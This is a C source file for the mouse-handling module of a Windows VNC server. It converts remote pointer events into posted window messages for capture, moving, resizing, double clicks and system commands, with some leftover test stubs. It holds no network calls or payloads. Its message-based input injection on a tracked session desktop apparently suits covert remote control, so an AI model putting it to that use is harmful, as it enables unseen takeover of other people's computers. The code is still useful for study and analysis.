//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: mouse.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	mouse event handling

#include "project.h"
#include "kbd.h"
#include "wnd_watcher.h"

static DWORD dwDoubleClickTime = 0;

HWND 
	MouseChangeCapture(
		PVNC_SESSION pSession,
		DWORD dwThreadID,
		HWND hNewWnd,
		WORD wNewArea,
		BOOL bPost
		)
{
	HWND hOldWnd = NULL;
	PVNC_SHARED_DATA pSharedData = SS_GET_DATA(pSession);

	SS_LOCK(pSession);
	{
		hOldWnd = pSharedData->hPrevCapturedWnd       = pSharedData->hCapturedWnd;
		pSharedData->dwPrevCapturedThreadID = pSharedData->dwCapturedThreadID;
		pSharedData->wPrevCapturedArea      = pSharedData->wCapturedArea;

		pSharedData->dwCapturedThreadID = dwThreadID;
		pSharedData->hCapturedWnd       = hNewWnd;
		pSharedData->wCapturedArea      = wNewArea;

		DbgPrint("thread=%i wCapturedArea = %i hCapturedWnd=%p\n",
			dwThreadID,
			wNewArea, hNewWnd
			);
	}
	SS_UNLOCK(pSession);

	if (IsWindowEx(&pSession->Desktop,hOldWnd)){
		if (bPost){
			PostMessage(hOldWnd,WM_CAPTURECHANGED,0,(LPARAM)hNewWnd);
		}
		else {
			DWORD_PTR Result;
			SendMessageTimeout(
				hOldWnd,WM_CAPTURECHANGED,0,(LPARAM)hNewWnd,
				SMTO_ABORTIFHUNG | SMTO_NORMAL,
				WND_MSG_TIMEOUT,
				&Result
				);
		}
	}
	return hOldWnd;
}

VOID 
	MouseReleaseCapture(
		PVNC_SESSION pSession
		)
{
	PVNC_SHARED_DATA pSharedData = SS_GET_DATA(pSession);

	//TEST
	return ;

	SS_LOCK(pSession);
	{
		DbgPrint("thread=%i wCapturedArea = %i hCapturedWnd=%p\n",
			GetCurrentThreadId(),
			pSharedData->wPrevCapturedArea,
			pSharedData->hPrevCapturedWnd
			);

		pSharedData->dwCapturedThreadID = pSharedData->dwPrevCapturedThreadID;
		pSharedData->hCapturedWnd       = pSharedData->hPrevCapturedWnd;
		pSharedData->wCapturedArea      = pSharedData->wPrevCapturedArea;

		//pSharedData->hPrevCapturedWnd       = NULL;
		//pSharedData->dwPrevCapturedThreadID = 0;
		//pSharedData->wPrevCapturedArea      = 0;
	}
	SS_UNLOCK(pSession);
}

VOID MouseMoveCapturedWindow(PVNC_SESSION pSession, LONG dwX, LONG dwY, BOOL bFinal)
{
	HWND hWnd; 
	HWND hParent;
	WORD wArea;
	BOOL bMoving = FALSE;
	BOOL bMovingOrResizing = TRUE;
	BOOL bChild;
	RECT rect;

	SS_LOCK( pSession );
	hWnd    = SS_GET_DATA(pSession)->hCapturedWnd;
	wArea   = SS_GET_DATA(pSession)->wCapturedArea;
	SS_UNLOCK( pSession );

	hParent = GetParent(hWnd);
	bChild  = ((GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD) == WS_CHILD );

	memcpy(&rect,&pSession->Desktop.rcMovingWnd,sizeof(rect));

	switch (wArea)
	{
	case HTCAPTION:
		{
			POINT pt;
			SS_LOCK( pSession );
			pt = SS_GET_DATA(pSession)->ptCursor;
			SS_UNLOCK( pSession );

			dwX-=pt.x;
			dwY-=pt.y;

			rect.left+=dwX;
			rect.right+=dwX;
			rect.top+=dwY;
			rect.bottom+=dwY;

			bMoving = TRUE;
			break;
		}
	case HTLEFT:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;

			rect.left += dwX;
			break;
		}
	case HTTOP:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;

			rect.top += dwY;
			break;
		}
	case HTRIGHT:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;

			rect.right+=dwX;
			break;
		}
	case HTBOTTOM:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;
			rect.bottom+=dwY;
			break;
		}
	case HTTOPLEFT:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;

			rect.top+=dwY;
			rect.left+=dwX;
			break;
		}
	case HTTOPRIGHT:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;

			rect.top+=dwY;
			rect.right+=dwX;
			break;
		}
	case HTBOTTOMLEFT:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;
			rect.bottom+=dwY;
			rect.left+=dwX;
			break;
		}
	case HTGROWBOX:
	case HTBOTTOMRIGHT:
		{
			POINT pt = SS_GET_DATA(pSession)->ptCursor;
			dwX-=pt.x;
			dwY-=pt.y;
			rect.bottom+=dwY;
			rect.right+=dwX;
			break;
		}
	default:
		{
			GetWindowRect(hWnd,&rect);
			bMovingOrResizing = FALSE;
		}
	}

	if (!IsRectEmpty(&rect))
	{
		if ( bMovingOrResizing )
		{
			memcpy(
				&pSession->Desktop.rcMovingWnd,
				&rect,
				sizeof(rect)
				);

			if (bChild){
				MapWindowPoints(NULL,hParent,(POINT *)&rect,sizeof(RECT)/sizeof(POINT));
			}

			if ( bMoving ){
				SetWindowPos(
					hWnd,
					bChild ? hParent : HWND_TOPMOST,
					rect.left,rect.top,
					rect.right-rect.left,
					rect.bottom-rect.top,
					//SWP_ASYNCWINDOWPOS+SWP_DEFERERASE+SWP_NOCOPYBITS+SWP_NOOWNERZORDER+SWP_NOREDRAW+SWP_NOZORDER
					SWP_ASYNCWINDOWPOS+SWP_NOCOPYBITS+SWP_NOOWNERZORDER+SWP_NOREDRAW+SWP_NOZORDER
					);
			}else {
				SetWindowPos(
					hWnd,
					bChild ? hParent : NULL,
					rect.left,rect.top,
					rect.right-rect.left,
					rect.bottom-rect.top,
					//SWP_ASYNCWINDOWPOS+SWP_DEFERERASE+SWP_NOCOPYBITS+SWP_NOOWNERZORDER+SWP_NOMOVE+SWP_FRAMECHANGED
					SWP_NOACTIVATE|SWP_NOZORDER
					);
			}
		}
	}
	return;
}

DWORD MouseCheckForDoubleClick( PVNC_SESSION pSession, HWND hWnd, DWORD uMsg, LPARAM dwPoints)
{
	DWORD dwDoubleClickMessage = 0;
	BOOL bNC = FALSE;
	POINT pt = {LOWORD(dwPoints),HIWORD(dwPoints)};

	switch (uMsg)
	{
	case WM_NCLBUTTONDOWN:
		{
			dwDoubleClickMessage=WM_NCLBUTTONDBLCLK;
			bNC=TRUE;
			break;
		}
	case WM_NCMBUTTONDOWN:
		{
			dwDoubleClickMessage=WM_NCMBUTTONDBLCLK;
			bNC=TRUE;
			break;
		}
	case WM_NCRBUTTONDOWN:
		{
			dwDoubleClickMessage=WM_NCRBUTTONDBLCLK;
			bNC=TRUE;
			break;
		}
	case WM_LBUTTONDOWN:
		{
			dwDoubleClickMessage=WM_LBUTTONDBLCLK;
			break;
		}
	case WM_MBUTTONDOWN:
		{
			dwDoubleClickMessage=WM_MBUTTONDBLCLK;
			break;
		}
	case WM_RBUTTONDOWN:
		{
			dwDoubleClickMessage=WM_RBUTTONDBLCLK;
			break;
		}
	}

	if (dwDoubleClickMessage)
	{
		DWORD dwTimeOfMessage=GetTickCount();

		int ptX=pt.x - pSession->Desktop.ptLastDownPoints.x;
		int ptY=pt.y - pSession->Desktop.ptLastDownPoints.y;

		if (ptX < 0){
			ptX*=-1;
		}
		if (ptY < 0){
			ptY*=-1;
		}

		if ((pSession->Desktop.hLastDownWindow == hWnd) && 
			(pSession->Desktop.dwLastDownMessage == uMsg) &&
			((dwTimeOfMessage - pSession->Desktop.dwLastDownTime) <= dwDoubleClickTime) && 
			((bNC) || (GetClassLongPtr(hWnd,GCL_STYLE) & CS_DBLCLKS)) &&
			((ptX <= 2) && (ptY <= 2)))
		{
			pSession->Desktop.ptLastDownPoints.x=0;
			pSession->Desktop.ptLastDownPoints.y=0;
			pSession->Desktop.dwLastDownMessage=0;
			pSession->Desktop.dwLastDownTime=0;
			pSession->Desktop.hLastDownWindow=NULL;
			return dwDoubleClickMessage;
		}

		pSession->Desktop.dwLastDownMessage=uMsg;
		pSession->Desktop.dwLastDownTime=dwTimeOfMessage;
		pSession->Desktop.hLastDownWindow=hWnd;
		pSession->Desktop.ptLastDownPoints=pt;
	}
	return uMsg;
}

VOID 
	MouseEvent(
		PVNC_SESSION pSession,
		HWND hWnd,
		HWND hParent,
		PWINDOWINFO wiInfo,
		WORD wHitTest,
		DWORD uMsg,
		DWORD ncMessage,
		LPARAM dwClientCursorPos,
		LPARAM dwScreenCursorPos
		)
{

	HWND hWndParent = GetAncestor(hWnd,GA_ROOT);
	HWND hPopUp     = GetTopPopupWindow(&pSession->Desktop,hWndParent);
	HWND hTopLevel  = NULL;

	WORD wCommand =0;
	WPARAM wParam = 0;
	DWORD_PTR dwResult;
	BOOL bIsMDI = FALSE;

	if (IsMDI(hWnd)){
		hWndParent = hWnd;
		bIsMDI = TRUE;
	}

	if ((uMsg == WM_LBUTTONDOWN) || (uMsg == WM_MBUTTONDOWN) || (uMsg == WM_RBUTTONDOWN))
	{
		HWND hMenu=NULL;

		SS_GET_DATA(pSession)->bTrayIconUnderCursor = FALSE;

		if ((hWnd == pSession->Desktop.hTrayUserNotifyToolbarWnd) || 
			(hWnd == pSession->Desktop.hTraySystemNotifyToolbarWnd) || 
			(hWnd == pSession->Desktop.hTrayUserNotifyOverflowToolbarWnd))
		{
			DWORD_PTR Result;

			if ( SendMessageTimeout(
					hWnd,SS_GET_DATA(pSession)->dwVNCMessage,
					VMW_TBHITTEST,
					dwClientCursorPos,
					SMTO_ABORTIFHUNG | SMTO_NORMAL,
					WND_MSG_TIMEOUT,
					&Result
					) && Result >= 0 )
			{
				SS_GET_DATA(pSession)->bTrayIconUnderCursor = TRUE;
			}
		}

#if 0 //TODO:
		if (lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
		{
			DestroyTaskSwitcherWnd(lpServer,false);
			return;
		}
#endif
		if ( IsMenuEx( &pSession->Desktop, hWnd ) ){
			hMenu=hWnd;
		}
		else if (IsMenuEx(&pSession->Desktop,hWndParent)){
			hMenu=hWndParent;
		}
		DestroyMenus(&pSession->Desktop,hMenu);

		if ((!IsXP()) && (hWnd == pSession->Desktop.hTrayWnd))
		{
			SetForegroundWnd(pSession,hWnd);
			hParent = pSession->Desktop.hTrayWnd;
			hWnd    = pSession->Desktop.hStartBtnWnd;
			SetForegroundWnd(pSession,hWnd);
		}

		if (uMsg == WM_LBUTTONDOWN){
			wParam=VMW_TBLCLICK;
		}
		else if (uMsg == WM_RBUTTONDOWN){
			wParam=VMW_TBRCLICK;
		}

		if ((hWnd == pSession->Desktop.hToolBarWnd) && (wParam)){
			PostMessage(
				pSession->Desktop.hToolBarWnd,
				SS_GET_DATA(pSession)->dwVNCMessage,
				wParam,
				dwClientCursorPos
				);
		}

		hTopLevel = pSession->Desktop.hLastTopLevelWindow;
		if ((IsXP()) || ((hTopLevel != pSession->Desktop.hTrayWnd) && (hTopLevel != pSession->Desktop.hStartBtnWnd))){
			hTopLevel = SS_GET_FOREGROUND_WND(pSession);
		}

		if ((hParent != hTopLevel) && 
			(!(GetWindowClassFlags(&pSession->Desktop,hParent) & WCF_NO_CAPTURE)))
		{
			BOOL bUpdateFgd = TRUE;
			if (hPopUp)
			{
				hWnd=hPopUp;
				hParent = GetAncestor(hWnd,GA_ROOT);
			}

			// check if old foreground window is a child of new fgd windows
			// and old window is a tool window
			if ( hParent == GetWindow(hTopLevel,GW_OWNER))
			{
				WINDOWINFO wiInfo;
				wiInfo.cbSize=sizeof(WINDOWINFO);
				if ( GetWindowInfo(hTopLevel,&wiInfo) && ( wiInfo.dwExStyle & WS_EX_TOOLWINDOW ) )
				{
					bUpdateFgd = FALSE;
				}
			}

			if ( bUpdateFgd ){
				DbgPrint("SetForegroundWnd hWnd=%p hParent=%p\n",hWnd,hParent);
				SetForegroundWnd(pSession,hParent);

				if ((SendMessageTimeout(
						hWnd,
						WM_MOUSEACTIVATE,
						(WPARAM)hWndParent,
						MAKELPARAM(wHitTest,uMsg),
						SMTO_ABORTIFHUNG+SMTO_NORMAL,100,&dwResult)) && 
						((dwResult == MA_ACTIVATEANDEAT) || (dwResult == MA_NOACTIVATEANDEAT)))
				{
					return;
				}

				if (!IsXP()){
					pSession->Desktop.hLastTopLevelWindow = hParent/*hWndParent*/;
				}
			}
		}
	}

	if ( hPopUp ){
		return;
	}

	{
		CHAR szClassName[128];
		GetClassNameA(hWnd,szClassName,128);
		switch(uMsg) 
		{
		case WM_LBUTTONUP:
			DbgPrint("WM_LBUTTONUP hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		case WM_LBUTTONDOWN:
			DbgPrint("WM_LBUTTONDOWN hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		case WM_RBUTTONUP:
			DbgPrint("WM_RBUTTONUP hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		case WM_RBUTTONDOWN:
			DbgPrint("WM_RBUTTONDOWN hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		}
	}

	PostMessage(hWnd,WM_SETCURSOR,(WPARAM)hWnd,MAKELPARAM(wHitTest,uMsg));
	if (wHitTest == HTCLIENT)
	{
		PostMessage(
			hWnd,
			MouseCheckForDoubleClick(pSession,hWnd,uMsg,dwScreenCursorPos),
			KbdUpdateInputState(pSession,0,FALSE),
			dwClientCursorPos
			);
		return;
	}

	ncMessage = 
		MouseCheckForDoubleClick(
			pSession,
			hWnd,
			ncMessage,
			dwScreenCursorPos
			);

	switch (wHitTest)
	{
	case HTSYSMENU:
		{
			if (ncMessage == WM_NCLBUTTONDBLCLK)
			{
				HMENU hMenu = GetSystemMenu(hWnd,FALSE);
				if (hMenu)
				{
					wCommand = GetMenuDefaultItem ( hMenu,FALSE,GMDI_GOINTOPOPUPS);
					if (wCommand != -1)
					{
						MENUITEMINFO miiInfo;
						miiInfo.cbSize=sizeof(miiInfo);
						miiInfo.fMask=MIIM_STATE;
						if (GetMenuItemInfo(hMenu,wCommand,MF_BYCOMMAND,&miiInfo))
						{
							if (miiInfo.fState & MFS_GRAYED)
								wCommand=0;
						}
					}
					else{
						wCommand=0;
					}
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
			}
			break;
		}
	case HTMINBUTTON:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				//if (wiInfo->dwStyle & WS_MINIMIZEBOX)
				{
					wCommand=SC_MINIMIZE;
				}
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			break;
		}
	case HTMAXBUTTON:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				//if (wiInfo->dwStyle & WS_MAXIMIZEBOX)
				{
					wCommand=(wiInfo->dwStyle & WS_MAXIMIZE) ? SC_RESTORE:SC_MAXIMIZE;
				}
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			break;
		}
	case HTCLOSE:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				wCommand=SC_CLOSE;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			break;
		}
	case HTHELP:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				wCommand=SC_CONTEXTHELP;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}else if ( ncMessage == WM_NCLBUTTONDOWN ){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				goto postMessage;
			}
			break;
		}
	case HTVSCROLL:
	case HTHSCROLL:
		{
			if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				break;
			}else if (ncMessage == WM_NCLBUTTONDOWN){
				MouseChangeCapture(
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,
					HTNOWHERE,
					TRUE
					);
			}
			goto postMessage;
		}
	case HTMENU:
		{
			if (ncMessage == WM_NCLBUTTONDOWN)
			{
				PostMessage(hWnd,SS_GET_DATA(pSession)->dwVNCMessage,VMW_EXECUTE_MENU,0);
				break;
			}
			else if (ncMessage == WM_NCMOUSEMOVE)
			{
				PostMessage(hWnd,SS_GET_DATA(pSession)->dwVNCMessage,VMW_HILITE_MENU,0);
				break;
			}
		}
	case HTCAPTION:
		{
			if (ncMessage == WM_NCLBUTTONDBLCLK){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				goto postMessage;
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				wCommand=0xFFFF;
			}
			else if (ncMessage == WM_NCLBUTTONDOWN){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				MouseChangeCapture(
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,
					wHitTest,
					TRUE
					);
			}
			break;
		}
	case HTLEFT:
	case HTRIGHT:
	case HTTOP:
	case HTTOPLEFT:
	case HTTOPRIGHT:
	case HTBOTTOM:
	case HTBOTTOMLEFT:
	case HTBOTTOMRIGHT:
		{
			if ( !bIsMDI ){
				hWnd = GetAncestor(hWnd,GA_ROOT);;
			}
			if (ncMessage == WM_NCLBUTTONDOWN){
				MouseChangeCapture(
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,
					wHitTest,
					TRUE
					);
			}
			break;
		}
	default:
postMessage:
		{
			PostMessage(hWnd,ncMessage,wHitTest,dwScreenCursorPos);
			break;
		}
	}

	if (wCommand)
	{
		if (wCommand == 0xFFFF){
			PostMessage(hWnd,WM_CONTEXTMENU,(WPARAM)hWnd,dwScreenCursorPos);
		}
		else{
			PostMessage(hWnd,WM_SYSCOMMAND,wCommand,dwScreenCursorPos);
		}
	}
	return;
}

VOID 
	ProcessMouMsg(
		PVNC_SESSION pSession,
		DWORD dwFlags,
		LONG dwX,LONG dwY,
		DWORD dwData
		)
{
	WORD wOldInputState = 0;
	HWND hCapturedWnd = NULL;
	WORD wCapturedArea;
	BOOL bIsMidi = FALSE;
	BOOL bOldXP = (IsXP() && (OsGetSP() < 3 ));

	SS_LOCK(pSession);
	hCapturedWnd  = SS_GET_DATA(pSession)->hCapturedWnd;
	wCapturedArea = SS_GET_DATA(pSession)->wCapturedArea;
	SS_UNLOCK(pSession);

	if ( wCapturedArea != HTNOWHERE )
	{
		if (dwFlags & MOUSEEVENTF_MOVE)
		{
			if (!pSession->Desktop.bMoving)
			{
				GetWindowRect( hCapturedWnd, &pSession->Desktop.rcMovingWnd );
				pSession->Desktop.bMoving = TRUE;
			}
			MouseMoveCapturedWindow( pSession, dwX, dwY, FALSE );
			//TEST!!!
			//dwFlags &= ~MOUSEEVENTF_MOVE; //???
		}

		if (dwFlags & MOUSEEVENTF_LEFTUP)
		{
			if ( pSession->Desktop.bMoving )
			{
				MouseMoveCapturedWindow(pSession,dwX,dwY,TRUE);
				pSession->Desktop.bMoving = FALSE;
			}
			MouseChangeCapture(pSession,0,NULL,HTNOWHERE,TRUE);
		}
	}
	else
	{
		if (pSession->Desktop.bMoving)
		{
			MouseMoveCapturedWindow(pSession,dwX,dwY,TRUE);
			pSession->Desktop.bMoving = FALSE;
		}
		SS_LOCK(pSession);
		hCapturedWnd  = SS_GET_DATA(pSession)->hCapturedWnd;
		SS_UNLOCK(pSession);
		wOldInputState=(!hCapturedWnd) ? 0 : KbdUpdateInputState(pSession,0,FALSE);
	}

	SS_LOCK(pSession);
	{
		SS_GET_DATA(pSession)->ptCursor.x = dwX;
		SS_GET_DATA(pSession)->ptCursor.y = dwY;
	}
	SS_UNLOCK(pSession);

	if (dwFlags)
	{
		DWORD bLDown = dwFlags & MOUSEEVENTF_LEFTDOWN;
		DWORD bLUp   = dwFlags & MOUSEEVENTF_LEFTUP;
		DWORD bMUp,bMDown;
		DWORD bRUp,bRDown;
		BOOL bClick = FALSE;
		WORD  wHitTest;
		HWND hWnd,hParent = NULL;
		POINT Cursor;

		if (bLDown){
			KbdUpdateInputState(pSession,VK_LBUTTON,TRUE);
			bClick = TRUE;
		}
		else if (bLUp){
			KbdUpdateInputState(pSession,VK_LBUTTON,FALSE);
			bClick = TRUE;
		}

		bMDown = dwFlags & MOUSEEVENTF_MIDDLEDOWN;
		bMUp   = dwFlags & MOUSEEVENTF_MIDDLEUP;
		if (bMDown){
			KbdUpdateInputState(pSession,VK_MBUTTON,TRUE);
			bClick = TRUE;
		}
		else if (bMUp){
			KbdUpdateInputState(pSession,VK_MBUTTON,FALSE);
			bClick = TRUE;
		}

		bRDown = dwFlags & MOUSEEVENTF_RIGHTDOWN;
		bRUp   = dwFlags & MOUSEEVENTF_RIGHTUP;
		if (bRDown){
			KbdUpdateInputState(pSession,VK_RBUTTON,TRUE);
			bClick = TRUE;
		}
		else if (bRUp){
			KbdUpdateInputState(pSession,VK_RBUTTON,FALSE);
			bClick = TRUE;
		}

		Cursor = SS_GET_DATA(pSession)->ptCursor;

		hWnd = _WindowFromPoint(pSession,SS_GET_DATA(pSession)->ptCursor,&wHitTest,&hParent,0,bClick);
		if ((wHitTest >= HTSIZEFIRST) && (wHitTest <= HTSIZELAST))
		{
			LONG_PTR dwStyle=GetWindowLongPtr(hWnd,GWL_STYLE);
			if ((dwStyle & WS_CHILD) && (!IsStyleHaveSizeBorders(dwStyle)))
			{
				HWND hParent=GetParent(hWnd);
				if (hParent){
					hWnd=hParent;
				}
			}
		}

		if ((hWnd) && 
			(GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_MOUSE_AUTOCAPTURE) && 
			(!pSession->Desktop.bMoving))
		{
			if (hWnd != hCapturedWnd){
				MouseChangeCapture ( 
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,
					HTNOWHERE,
					TRUE
					);
			}
			wHitTest = HTCLIENT;
		}
		else if (hCapturedWnd)
		{
			if (IsWindowEx(&pSession->Desktop,hCapturedWnd) && 
				((!hWnd) || (hCapturedWnd == hWnd) || (wOldInputState & (VK_LBUTTON | VK_MBUTTON | VK_RBUTTON))))
			{
				hWnd=hCapturedWnd;
			}
			else if (dwFlags != (MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE)){
				MouseChangeCapture(
					pSession,
					0,NULL,
					HTNOWHERE,
					TRUE
					);
			}
		}

		if (hWnd)
		{
			WINDOWINFO wiInfo;
			wiInfo.cbSize=sizeof(WINDOWINFO);

			if (GetWindowInfo(hWnd,&wiInfo))
			{
				LPARAM dwScreenCursorPos=MAKELPARAM(dwX,dwY);
				LPARAM dwClientCursorPos = 0;
				DWORD_PTR Result;
				BOOL bXpMouse = FALSE; //(GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_XP_MOUSE);

				if (wHitTest == HTCLIENT)
				{
					if (GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_MOUSE_CLIENT_TO_SCREEN){
						dwClientCursorPos = dwScreenCursorPos;
					}
					else {
						dwClientCursorPos = 
							MAKELPARAM(dwX-wiInfo.rcClient.left,dwY-wiInfo.rcClient.top);
					}
				}

				SendMessageTimeout(
					hWnd,SS_GET_DATA(pSession)->dwVNCMessage,VMW_UPDATE_KEYSTATE,0,
					SMTO_ABORTIFHUNG | SMTO_NORMAL,
					WND_MSG_TIMEOUT,
					&Result
					);

#define HANDLE_MOUSE_EVENT(_MSG,_NCMSG)\
	((bOldXP||bXpMouse) ? MouseEventXP : MouseEvent) \
		(pSession,hWnd,hParent,&wiInfo,wHitTest,_MSG,_NCMSG, dwClientCursorPos,dwScreenCursorPos)

				if (bLDown){
					HANDLE_MOUSE_EVENT(WM_LBUTTONDOWN,WM_NCLBUTTONDOWN);
				}
				else if (bLUp){
					HANDLE_MOUSE_EVENT(WM_LBUTTONUP,WM_NCLBUTTONUP);
				}

				if (bMDown){
					HANDLE_MOUSE_EVENT(WM_MBUTTONDOWN,WM_NCMBUTTONDOWN);
				}
				else if (bMUp){
					HANDLE_MOUSE_EVENT(WM_MBUTTONUP,WM_NCMBUTTONUP);
				}

				if (bRDown){
					HANDLE_MOUSE_EVENT(WM_RBUTTONDOWN,WM_NCRBUTTONDOWN);
				}
				else if (bRUp){
					HANDLE_MOUSE_EVENT(WM_RBUTTONUP,WM_NCRBUTTONUP);
				}

				if (dwFlags & MOUSEEVENTF_MOVE){
					HANDLE_MOUSE_EVENT(WM_MOUSEMOVE,WM_NCMOUSEMOVE);
				}

				if (dwFlags & MOUSEEVENTF_WHEEL)
				{
					WORD wState  = KbdUpdateInputState(pSession,0,FALSE);
					HWND hOurWnd = GetWindowFocus(SS_GET_FOREGROUND_WND(pSession));
					if (!hOurWnd){
						hOurWnd = hWnd;
					}
					PostMessage(hOurWnd,WM_MOUSEWHEEL,MAKEWPARAM(wState,dwData),dwScreenCursorPos);
				}
			}
		}
	}
	return;
}

void OnPointerEvent(
	IN PVNC_SESSION pVncSession,
	IN ULONG buttonMask,
	IN int x,
	IN int y
	)
{
	DWORD dwWheel = 0;
	DWORD dwFlags = MOUSEEVENTF_ABSOLUTE;
	BOOL bSwapped=GetSystemMetrics(SM_SWAPBUTTON) ? TRUE:FALSE;

	if ( dwDoubleClickTime == 0 ){
		dwDoubleClickTime = GetDoubleClickTime();
	}

	if (( x != pVncSession->Desktop.LastXPosition) || 
		( y != pVncSession->Desktop.LastYPosition))
	{
		dwFlags|=MOUSEEVENTF_MOVE;
	}

	if ((buttonMask & rfbButton1Mask) != (pVncSession->Desktop.LastButtonMask & rfbButton1Mask))
	{
		if ( buttonMask & rfbButton1Mask ){
			dwFlags|=bSwapped ? MOUSEEVENTF_RIGHTDOWN:MOUSEEVENTF_LEFTDOWN;
		}
		else {
			dwFlags|=bSwapped ? MOUSEEVENTF_RIGHTUP:MOUSEEVENTF_LEFTUP;
		}
	}

	if ((buttonMask & rfbButton3Mask) != (pVncSession->Desktop.LastButtonMask & rfbButton3Mask))
	{
		if ( buttonMask & rfbButton3Mask ){
			dwFlags |= bSwapped ? MOUSEEVENTF_LEFTDOWN:MOUSEEVENTF_RIGHTDOWN;
		}
		else {
			dwFlags |= bSwapped ? MOUSEEVENTF_LEFTUP:MOUSEEVENTF_RIGHTUP;
		}
	}

	if ( ( buttonMask & rfbButton2Mask ) != (pVncSession->Desktop.LastButtonMask & rfbButton2Mask)){
		dwFlags|=( buttonMask & rfbButton2Mask ) ? MOUSEEVENTF_MIDDLEDOWN:MOUSEEVENTF_MIDDLEUP;
	}

	if ( buttonMask & rfbWheelUpMask )
	{
		dwFlags|=MOUSEEVENTF_WHEEL;
		dwWheel=WHEEL_DELTA;
	}

	if ( buttonMask & rfbWheelDownMask )
	{
		dwFlags|=MOUSEEVENTF_WHEEL;
		dwWheel=(DWORD)(-WHEEL_DELTA);
	}

	pVncSession->Desktop.LastButtonMask = buttonMask;
	pVncSession->Desktop.LastXPosition = x;
	pVncSession->Desktop.LastYPosition = y;
	ProcessMouMsg(pVncSession,dwFlags,x,y,dwWheel);
	return;
}